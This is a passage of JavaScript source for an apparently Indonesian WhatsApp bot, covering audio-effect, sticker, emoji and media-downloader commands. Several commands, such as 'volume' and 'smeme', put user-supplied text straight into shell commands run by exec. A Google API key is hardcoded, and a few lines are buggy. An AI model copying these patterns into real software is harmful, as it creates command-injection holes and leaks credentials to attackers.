let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply('Gagal mengkonversi audio ke ptt')
let topt = fs.readFileSync(ran)
await Araa.sendMessage(from, { audio: topt, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audio')
}
break
case 'togif':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isQuotedSticker) {
onlyWait()
let file = await Araa.downloadAndSaveMediaMessage(quoted)
let outGif = `./temp/${getRandom('.gif')}`
let outMp4 = `./temp/${getRandom('.mp4')}`
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}
await sendGif(fs.readFileSync(outMp4))
fs.unlinkSync(outGif)
fs.unlinkSync(outMp4)
fs.unlinkSync(file)
})
})
} else if (isQuotedVideo) {
onlyWait()
let outMp4 = getRandom('.mp4')
let file = await Araa.downloadAndSaveMediaMessage(quoted)
let nana = await fs.readFileSync(file)
await sendGif(nana)
await fs.unlinkSync(file)
}
break
case 'volume':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (Number(args[0]) >= 11) return setReply('Maksimal volume adalah 10')
if (isQuotedAudio) {
onlyWait()
let media3 = await Araa.downloadAndSaveMediaMessage(quoted)
let rname = getRandom('.mp3')
exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, async (err, stderr, stdout) => {
if (err) return setReply('Error!')
let jadie = fs.readFileSync(rname)
await Araa.sendMessage(from, { audio: jadie, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
fs.unlinkSync(rname)
fs.unlinkSync(media3)
})
} else {
setReply('Reply audio!')
}
break
case 'hode':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isQuotedAudio) {
onlyWait()
let medok = await Araa.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${medok} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(medok)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await Araa.sendMessage(from, { mimetype: 'audio/mp4', ptt: true, audio: buffer453 }, { quoted: m })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
case 'ghost':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isQuotedAudio) {
onlyWait()
let mele = await Araa.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${mele} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(mele)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await Araa.sendMessage(from, { mimetype: 'audio/mp4', ptt: true, audio: buffer453 }, { quoted: m })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
case 'nightcore':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isQuotedAudio) {
onlyWait()
let mela = await Araa.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${mela} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(mela)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await Araa.sendMessage(from, { mimetype: 'audio/mp4', ptt: true, audio: buffer453 }, { quoted: m })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
case 'tupai':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isQuotedAudio) {
onlyWait()
let medoi = await Araa.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${medoi} -filter:a "atempo=0.8,asetrate=65100" ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(medoi)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await Araa.sendMessage(from, { mimetype: 'audio/mp4', ptt: true, audio: buffer453 }, { quoted: m })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
case 'imut':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isQuotedAudio) {
onlyWait()
let masa = await Araa.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${masa} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(masa)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await Araa.sendMessage(from, { mimetype: 'audio/mp4', ptt: true, audio: buffer453 }, { quoted: m })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
//================================================================================\\
case 'emojimix':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let [emoji1, emoji2] = q.split`+`
if (!emoji1) return setReply(`Example : ${prefix + command} 😅+🤔`)
if (!emoji2) return setReply(`Example : ${prefix + command} 😅+🤔`)
let anu = await fetchJson(
`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(
emoji1
)}_${encodeURIComponent(emoji2)}`
)
for (let res of anu.results) {
await Araa.sendImageAsSticker(from, res.url, m)
}
}
break
case 'emojiap':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('emojinya?')
setReply('Converting to emoji Apple')
emoji.get(`${args[0]}`).then((emoji) => {
let teks = `${emoji.images[0].url}`
Araa.sendImageAsSticker(from, teks, m)
})
}
break
case 'emojigo':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('emojinya?')
setReply('Converting to emoji Google')
emoji.get(`${args[0]}`).then((emoji) => {
let teks = `${emoji.images[1].url}`
Araa.sendImageAsSticker(from, teks, m)
})
}
break
case 'emojisa':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('emojinya?')
setReply('Converting to emoji Samsung')
emoji.get(`${args[0]}`).then((emoji) => {
let teks = `${emoji.images[2].url}`
Araa.sendImageAsSticker(from, teks, m)
})
}
break
case 'emojims':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('emojinya?')
setReply('Converting to emoji Microsoft')
emoji.get(`${args[0]}`).then((emoji) => {
let teks = `${emoji.images[3].url}`
Araa.sendImageAsSticker(from, teks, m)
})
}
break
case 'emojiwa':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('emojinya?')
setReply('Converting to emoji WhatsApp')
emoji.get(`${args[0]}`).then((emoji) => {
let teks = `${emoji.images[4].url}`
Araa.sendImageAsSticker(from, teks, m)
})
}
break
case 'emojitw':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('emojinya?')
setReply('Converting to emoji Twitter')
emoji.get(`${args[0]}`).then((emoji) => {
let teks = `${emoji.images[5].url}`
Araa.sendImageAsSticker(from, teks, m)
})
}
break
case 'emojifb':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('emojinya?')
setReply('Converting to emoji Facebook')
emoji.get(`${args[0]}`).then((emoji) => {
let teks = `${emoji.images[6].url}`
Araa.sendImageAsSticker(from, teks, m)
})
}
break
case 'emojijp':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('emojinya?')
await setReply('Converting to emoji joypixel')
await emoji.get(`${args[0]}`).then((emoji) => {
let teks = `${emoji.images[7].url}`
Araa.sendImageAsSticker(from, teks, m)
})
}
break
case 'emojiom':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('emojinya?')
await setReply('Converting to emoji openmoji')
await emoji.get(`${args[0]}`).then((emoji) => {
let teks = `${emoji.images[8].url}`
Araa.sendImageAsSticker(from, teks, m)
})
}
break
case 'emojied':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('emojinya?')
await setReply('Converting to emoji emojidex')
await emoji.get(`${args[0]}`).then((emoji) => {
let teks = `${emoji.images[9].url}`
Araa.sendImageAsSticker(from, teks, m)
})
}
break
case 'emojimes':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('emojinya?')
await setReply('Converting to emoji messenger')
await emoji.get(`${args[0]}`).then((emoji) => {
let teks = `${emoji.images[10].url}`
Araa.sendImageAsSticker(from, teks, m)
})
}
break
case 'emojilt':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('emojinya?')
await setReply('Converting to emoji logitech')
await emoji.get(`${args[0]}`).then((emoji) => {
let teks = `${emoji.images[11].url}`
Araa.sendImageAsSticker(from, teks, m)
})
}
break
case 'emojimo':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('emojinya?')
await setReply('Converting to emoji mozila')
await emoji.get(`${args[0]}`).then((emoji) => {
let teks = `${emoji.images[13].url}`
Araa.sendImageAsSticker(from, teks, m)
})
}
break
//================================================================================\\
case 'sticker':
case 's':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isImage || isQuotedImage) {
try {
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await Araa.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00', // The sticker background color (only for full stickers)
})
let stok = getRandom('.webp')
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await Araa.sendMessage(from, { sticker: nah }, { quoted: m })
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err) {
if (err) {
return
}
var stream = await downloadContentFromMessage(m.message.imageMessage || m.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
var buffer = Buffer.from([])
for await (const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
var rand1 = 'sticker/' + getRandom('.jpg')
var rand2 = 'sticker/' + getRandom('.webp')
fs.writeFileSync(`./${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on('error', console.error)
.on('end', () => {
exec(`webpmux -set exif ./media/sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
await Araa.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: m })
await fs.unlinkSync(`./${rand1}`)
await fs.unlinkSync(`./${rand2}`)
})
})
.addOutputOptions(['-vcodec','libwebp','-vf',"scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse",]).toFormat('webp').save(`${rand2}`)
}
} else if (isVideo || isQuotedVideo) {
try {
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await Araa.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 1, // The quality of the output file
background: '#FFFFFF00', // The sticker background color (only for full stickers)
})
let stok = getRandom('.webp')
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await Araa.sendMessage(from, { sticker: nah }, { quoted: m })
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err) {
var stream = await downloadContentFromMessage(m.message.imageMessage || m.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
var buffer = Buffer.from([])
for await (const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
var rand1 = 'sticker/' + getRandom('.mp4')
var rand2 = 'sticker/' + getRandom('.webp')
fs.writeFileSync(`./${rand1}`, buffer)
ffmpeg(`./${rand1}`).on('error', console.error).on('end', () => {
exec(`webpmux -set exif ./media/sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
await Araa.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: m })
await fs.unlinkSync(`./${rand1}`)
await s.unlinkSync(`./${rand2}`)
})
})
.addOutputOptions(['-vcodec','libwebp','-vf',"scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse",]).toFormat('webp').save(`${rand2}`)
}
} else {
setReply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim\nNote : Maximal vidio 10 detik!`)
}
break
case 'attp':
try {
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (args.length == 0) return setReply(`Example: ${prefix + command} ${ownerName}`)
await Araa.sendMessage(from, { sticker: { url: `https://api.xteam.xyz/attp?file&text=${encodeURI(q)}` } }, { quoted: m })
} catch (e) {
console.log(e)
setReply(`Maap sedang error coba lagi besok`)
}
break
case 'smeme':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply(`Masukan teks, contoh : ${prefix}smeme teks|teks`)
var top = q.split('|')[0] ? q.split('|')[0] : ''
var bottom = q.split('|')[1] ? q.split('|')[1] : ''
if (isQuotedImage) {
onlyWait()
try {
let { Sticker, StickerTypes } = require('wa-sticker-formatter')
let olalah = await Araa.downloadAndSaveMediaMessage(quoted)
let anuah = await TelegraPh(olalah)
let media = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`
await makeSticker(media, Sticker, StickerTypes)
await fs.unlinkSync(olalah)
} catch (err) {
let olalah = await Araa.downloadAndSaveMediaMessage(quoted)
let anuah = await TelegraPh(olalah)
let ranp = getRandom('.gif')
let rano = getRandom('.webp')
let anu2 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`
exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
if (err) return setReply(`${err}`)
await Araa.sendMessage(from, { sticker: fs.readFileSync(rano) }, { quoted: m })
await fs.unlinkSync(rano)
await fs.unlinkSync(ranp)
})
}
} else {
setReply('Gunakan foto!')
}
}
break
case 'triggered':
case 'wasted':
case 'comrade':
case 'horny':
case 'blur':
case 'pixelate':
case 'simpcard':
case 'lolice':
case 'glass':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if ((isQuotedVideo && m.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage.fileLength < 10000000) || isQuotedImage || isImage) {
onlyWait()
try {
let { Sticker, StickerTypes } = require('wa-sticker-formatter')
let olalah = await Araa.downloadAndSaveMediaMessage(quoted)
let anuah = await TelegraPh(olalah)
let media = `https://some-random-api.ml/canvas/${command}?avatar=${anuah}`
await makeSticker(media, Sticker, StickerTypes)
await fs.unlinkSync(olalah)
} catch (err) {
let owgi = await Araa.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(owgi)
let ranp = getRandom('.gif')
let rano = getRandom('.webp')
let anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${anu}`
exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
if (err) return setReply(`${err}`)
await Araa.sendMessage(from, { sticker: fs.readFileSync(rano) }, { quoted: m })
await fs.unlinkSync(owgi)
await fs.unlinkSync(ranp)
await fs.unlinkSync(rano)
})
}
} else if (isQuotedText) {
onlyWait()
try {
let { Sticker, StickerTypes } = require('wa-sticker-formatter')
let olalah = await Araa.profilePictureUrl(mentionByReply, 'image').catch((_) => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
let media = `https://some-random-api.ml/canvas/${command}?avatar=${olalah}`
await makeSticker(media, Sticker, StickerTypes)
await fs.unlinkSync(olalah)
} catch (err) {
console.log(err)
let oppp = await Araa.profilePictureUrl(mentionByReply, 'image').catch((_) => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
let anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${oppp}`
let ranp = getRandom('.gif')
let rano = getRandom('.webp')
exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
if (err) return setReply(`${err}`)
await Araa.sendMessage(from, { sticker: fs.readFileSync(rano) }, { quoted: m })
await fs.unlinkSync(oppp)
await fs.unlinkSync(ranp)
await fs.unlinkSync(rano)
})
}
} else {
setReply('Gunakan foto!')
}
break
case 'take':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (isImage || isQuotedImage || isQuotedSticker) {
try {
let ahuh = args.join(' ').split('|')
let satu = ahuh[0] !== '' ? ahuh[0] : `${pushname}`
let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await Araa.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: satu, // The pack name
author: dua, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00', // The sticker background color (only for full stickers)
})
let stok = getRandom('.webp')
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await Araa.sendMessage(from, { sticker: nah }, { quoted: m })
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err) {
console.log(err)
}
}
break
case 'patrick':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
onlyWait()
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik').then((res) => res.text()).then((body) => {
let tod = body.split('\n')
let pjr = tod[Math.floor(Math.random() * tod.length)]
Araa.sendImageAsSticker(from, pjr, m)
})
break
case 'gura':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
onlyWait()
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura').then((res) => res.text()).then((body) => {
let tod = body.split('\n')
let pjr = tod[Math.floor(Math.random() * tod.length)]
Araa.sendImageAsSticker(from, pjr, m)
})
break
case 'doge':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
onlyWait()
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing').then((res) => res.text()).then((body) => {
let tod = body.split('\n')
let pjr = tod[Math.floor(Math.random() * tod.length)]
Araa.sendImageAsSticker(from, pjr, m)
})
break
//================================================================================\\
case 'play':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('Teksnya mana om')
onlyWait()
let rus = await yts(q)
if (rus.all.length == '0') return setReply('Video tidak bisa di download')
let data = await rus.all.filter((v) => v.type == 'video')
try {
var res = data[0]
var info = await ytdl.getInfo(res.url)
} catch {
var res = data[1]
var info = await ytdl.getInfo(res.url)
}
let audio = ytdl.filterFormats(info.formats, 'audioonly')
let format = ytdl.chooseFormat(info.formats, { quality: '18' })
try {
var thumbnya = `https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`
} catch (err) {
var thumbnya = `https://i.ytimg.com/vi/${res.videoId}/default.jpg`
}
let inithumb = await getBuffer(thumbnya)
let options2 = {
externalAdReply: {
title: `⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻`,
body: `   ━━━━⬤──────────    click here to play music `,
description: 'Now Playing...',
mediaType: 1,
renderLargerThumbnail: true,
thumbnail: inithumb,
mediaUrl: res.url,
sourceUrl: res.url,
},
}
var toks = `
📂 Judul : ${res.title}
🌐 Ditonton : ${h2k(res.views)} Kali 
⏳ Durasi : ${res.timestamp}
👤 Channel : ${res.author.name}
🎧 Audio : ${FileSize(audio[0].contentLength)} 
🎬 Video : ${FileSize(format.contentLength)}`
let aklo = [
{ buttonId: `${prefix}playmp3 ${res.url} `, buttonText: { displayText: `ᴀᴜᴅɪᴏ` }, type: 'RESPONSE' },
{ buttonId: `${prefix}playmp4 ${res.url}`, buttonText: { displayText: `ᴠɪᴅɪᴏ` }, type: 'RESPONSE' },
]
Sendbutdocument(from, `*YOUTUBE DOWNLOADER*\n${toks}`, fake, fs.readFileSync('./media/image/thumbnaildokumen.jpg'), aklo, options2)
}
break
case 'playmp3':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isUrl) return setReply('Masukan link')
try {
setReply('*Downloading...*')
let info = await ytdl.getInfo(q)
let audioFormats = ytdl.filterFormats(info.formats, 'audioonly')
try {
var low = audioFormats[2].contentLength
} catch (err) {
var low = audioFormats[0].contentLength
}
if (Number(low) > 15000000) return setReply(`Bjir sizenya ${FileSize(low)}\nAu ah ga mao download 😤`)
if (audioFormats[0].contentLength == 'undefined') {
var rus = await yts(q)
var data = await rus.all.filter((v) => v.type == 'video')
var res = data[0]
if (res.timestamp.split(':') > '10') return setReply('Tidak bisa mendownload audio lebih dari 10 menit')
}
downloadMp3(q)
} catch (err) {
console.log(err)
}
break
case 'playmp4':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isUrl) return setReply('Masukan link')
let info = await ytdl.getInfo(q)
let format = ytdl.chooseFormat(info.formats, { quality: '18' })
if (Number(format.contentLength) > 40000000) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)
if (format.contentLength == 'undefined') {
var rus = await yts(q)
var data = await rus.all.filter((v) => v.type == 'video')
var res = data[0]
if (res.timestamp.split(':') > '10') return setReply('Tidak bisa mendownload video lebih dari 10 menit')
}
setReply('*Downloading...*')
downloadMp4(q)
}
break
case 'playmusic':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('Masukan judul lagu')
onlyWait()
if (q.startsWith('https://')) {
let nana = q.replace('https://m.', 'https://')
let scdl = await SoundCloud.create()
let res = await scdl.tracks.getTrack(nana)
console.log(res)
let teks = `
*SOUNDCLOUD DOWNLOADER*

📂 Judul : ${res.title}
⏰ Durasi : ${Math.round(res.full_duration / 1000 / 60)} Menit
◀️ Diputar : ${h2k(res.playback_count)} kali
❤️ Disukai : ${h2k(res.likes_count)}
🌏 Release : ${res.release_date}
♻️ Repost : ${h2k(res.reposts_count)}
🔈 Format : ${res.track_format}
`
try {
let anuah = res.artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch (err) {
let anuh = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU'
var yamiyami = await getBuffer(anuh)
}
let nano = [
{ buttonId: `${prefix}scmp3 ${res.permalink_url} `, buttonText: { displayText: `ᴀᴜᴅɪᴏ` }, type: 'RESPONSE' },
{ buttonId: `${prefix}scdoc ${res.permalink_url}`, buttonText: { displayText: `ᴅᴏᴄᴜᴍᴇɴᴛ` }, type: 'RESPONSE' },
]
Araa.sendButImage(from, teks, fake, yamiyami, nano, { contextInfo: forward })
} else {
let scdl = await SoundCloud.create()
let result = await scdl.search({
query: q,
limit: 20,
offset: 0,
filter: 'tracks',
})
let res = result.collection[0]
try {
var artis = res.publisher_metadata.artist
var album = res.publisher_metadata.album_title
} catch (err) {
var artis = res.user.full_name
var album = 'Tidak ada'
}
console.log(res)
let teks = `
*SOUNDCLOUD DOWNLOADER*

📂 Judul : ${res.title}
👤 Artis : ${artis}
💽 Album : ${album}
⏰ Durasi : ${Math.round(res.full_duration / 1000 / 60)} Menit
◀️ Diputar : ${h2k(res.playback_count)} kali
❤️ Disukai : ${h2k(res.likes_count)}
🌏 Release : ${res.release_date}
♻️ Repost : ${h2k(res.reposts_count)}
🔈 Format : ${res.track_format}
`
try {
let anuah = res.artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch (err) {
let anuh = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU'
var yamiyami = await getBuffer(anuh)
}
let nano = [
{ buttonId: `${prefix}scmp3 ${res.permalink_url} `, buttonText: { displayText: `ᴀᴜᴅɪᴏ` }, type: 'RESPONSE' },
{ buttonId: `${prefix}scdoc ${res.permalink_url}`, buttonText: { displayText: `ᴅᴏᴄᴜᴍᴇɴᴛ` }, type: 'RESPONSE' },
]
Araa.sendButImage(from, teks, fake, yamiyami, nano, { contextInfo: forward })
}
}
break
case 'ig':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('Masukan Link')
setReply(mess.wait)
if (!args[0].match(/https:\/\/www.instagram.com\/(p|reel|tv)/gi))
return setReply(`*Link salah! Perintah ini untuk mengunduh postingan ig/reel/tv, bukan untuk highlight/story!*\n\ncontoh:\n${prefix + command} https://www.instagram.com/p/BmjK1KOD_UG/?utm_medium=copy_link`)
let igreel = q.includes('https://www.instagram.com/reel/')
let kuntul = await instagramdlv3(args[0])
for (const { url } of kuntul) await Araa.sendMedia(from, url, m, { caption: 'Nih' })
}
break
case 'gimage':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (args.length < 1) return setReply('Apa Yang Mau Dicari?')
try {
googleImage(q).then(async (data) => {
let foto = data[Math.floor(Math.random() * data.length)]
if (data.length == '0') return setReply('Image tidak di temukan')
onlyWait()
Araa.sendMedia(from, foto, m, { caption: 'Nih' })
})
} catch (err) {
let teks = args.join(' ')
let res = await gis(teks, google)
function google(error, result) {
if (error) {
return setReply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')
} else {
var gugIm = result
var random = gugIm[Math.floor(Math.random() * gugIm.length)].url
Araa.sendMedia(from, random, m, { caption: `*Hasil Pencarian Dari :* ${teks}` })
}
}
}
}
break
case 'tiktoknowm':
case 'tiktok':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isPremium && !isLimit) 
{let ko = await Araa.sendMessage(from, { text: mess.limit }, { quoted: m })
setTimeout(() => deleteMessage(ko), 2500)
let kon = await Araa.sendMessage(from, { text: mess.wait }, { quoted: m })
setTimeout(() => deleteMessage(kon), 3000)}
if (args.length < 1) return setReply('Link?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply('Error link')
let buttons = [
{buttonId: `${prefix}tiktokmusik args[0]`, buttonText: {displayText: 'audio'}, type: 1}
]
tiktokdlv2(`${args[0]}`).then(res => {
let ep = res.video.no_watermark
console.log(ep)
Araa.sendMessage(from, {caption: "Nih", video: {url: ep}, buttons },{quoted: m})
})
}
break
case 'tiktokmusik':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isPremium && !isLimit) 
{let ko = await Araa.sendMessage(from, { text: mess.limit }, { quoted: m })
setTimeout(() => deleteMessage(ko), 2500)
let kon = await Araa.sendMessage(from, { text: mess.wait }, { quoted: m })
setTimeout(() => deleteMessage(kon), 3000)}
if (args.length < 1) return setReply('Link?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply('Error link')
tiktokdlv2(`${args[0]}`).then(async (res) => {
let ep = res.video.no_watermark
let nana = await getBuffer(ep)
let ran = getRandom('.mp3')
let ron = getRandom('.mp4')
fs.writeFileSync(ron, nana)
exec(`ffmpeg -i ${ron} -vn ${ran}`, (err) => {
fs.unlinkSync(ron)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
Araa.sendMessage(from, { audio: buffer453, mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(ran)
})
})
}
break
case 'pinterest':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (args.length < 2) return reply(`Kirim perintah ${command} query atau ${command} query --jumlah\nContoh :\n${command} cecan atau ${command} cecan --10`)
reply(mess.wait)
var jumlah
if (q.includes('--')) jumlah = q.split('--')[1]
pinterest(q.replace('--' + jumlah, '')).then(async (data) => {
if (q.includes('--')) {
if (data.result.length < jumlah) {
jumlah = data.result.length
reply(`Hanya ditemukan ${data.result.length}, foto segera dikirim`)
}
for (let i = 0; i < jumlah; i++) {
Araa.sendMessage(from, { image: { url: data.result[i] } })
}
} else {
var but = [{ buttonId: `${command} ${q}`, buttonText: { displayText: 'Next Photo' }, type: 1 }]
Araa.sendMessage(from, { caption: `Hasil pencarian dari ${q}`, image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: m })
}
})
break
case 'spotify':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('Masukan link Spotify')
let data = await spotify.getTrack(q)
let teks = `
Nama: ${data.name}
Artists: ${data.artists.join(' ')}
Album : ${data.album_name}
Release: ${data.release_date}

Mohon tunggu, sedang mengirim
File audio ${data.name}
`
await Araa.sendMessage(from, { caption: teks, image: { url: data.cover_url }, mimetype: 'image/jpeg' }, { quoted: m })
let song = await spotify.downloadTrack(q)
console.log(song)
await Araa.sendMessage(from, { audio: song, mimetype: 'audio/mp3' }, { quoted: m })
}
break
case 'ytmp3':{
